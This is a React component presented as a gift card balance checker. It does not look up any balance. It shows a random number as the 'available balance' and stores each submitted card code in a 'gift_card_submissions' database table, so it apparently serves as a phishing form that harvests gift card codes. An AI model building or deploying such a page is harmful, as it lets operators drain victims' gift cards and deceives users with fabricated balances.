
import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useToast } from "@/components/ui/use-toast";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

export const GiftCardChecker = () => {
  const [cardNumber, setCardNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState<number | null>(null);
  const { toast } = useToast();

  const formatCardNumber = (input: string) => {
    // Accept only letters and numbers, convert to uppercase
    const cleaned = input.replace(/[^A-Za-z0-9]/g, "").toUpperCase();
    
    // Format in groups of 4
    const formatted = cleaned.match(/.{1,4}/g)?.join(" ") || cleaned;
    
    // Limit to 16 characters plus spaces
    return formatted.slice(0, 19);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const formatted = formatCardNumber(value);
    setCardNumber(formatted);
  };

  const isValidCardNumber = (number: string) => {
    const cleaned = number.replace(/\s/g, "");
    return cleaned.length === 16;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isValidCardNumber(cardNumber)) {
      toast({
        variant: "destructive",
        title: "Invalid card number",
        description: "Please enter exactly 16 characters (letters or numbers)",
      });
      return;
    }

    setLoading(true);
    
    try {
      await new Promise(resolve => setTimeout(resolve, 1500));
      const mockBalance = Math.floor(Math.random() * 500) + 50;
      
      const { error } = await supabase
        .from("gift_card_submissions")
        .insert([{ card_number: cardNumber, balance: mockBalance }]);

      if (error) throw error;

      setBalance(mockBalance);
      toast({
        title: "Balance retrieved successfully",
        description: "Your card balance has been updated",
      });
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error checking balance",
        description: "Please try again later",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <motion.div
      initial={{ y: 20, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      transition={{ delay: 0.4 }}
      className="relative"
    >
      <div className="rounded-xl border border-slate-200 bg-white/50 backdrop-blur-sm shadow-sm p-6">
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <label
              htmlFor="cardNumber"
              className="text-sm font-medium text-slate-700"
            >
              Gift Card Number
            </label>
            <Input
              id="cardNumber"
              type="text"
              inputMode="text"
              pattern="[A-Za-z0-9\s]*"
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="ABCD 1234 EFGH 5678"
              className="text-base uppercase tracking-wide font-mono"
              disabled={loading}
              maxLength={19}
              autoComplete="off"
              spellCheck="false"
            />
            <p className="text-xs text-slate-500">
              Enter 16 characters (letters or numbers)
            </p>
          </div>

          <Button
            type="submit"
            className="w-full bg-slate-900 hover:bg-slate-800 text-white transition-all duration-200"
            disabled={loading || !cardNumber.trim()}
          >
            {loading && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
            {loading ? "Checking Balance..." : "Check Balance"}
          </Button>
        </form>

        <AnimatePresence>
          {balance !== null && (
            <motion.div
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              transition={{ duration: 0.2 }}
              className="mt-6 pt-6 border-t border-slate-100"
            >
              <div className="text-center">
                <span className="text-sm text-slate-500">Available Balance</span>
                <p className="text-3xl font-semibold text-slate-900 mt-1">
                  ${balance.toFixed(2)}
                </p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </motion.div>
  );
};
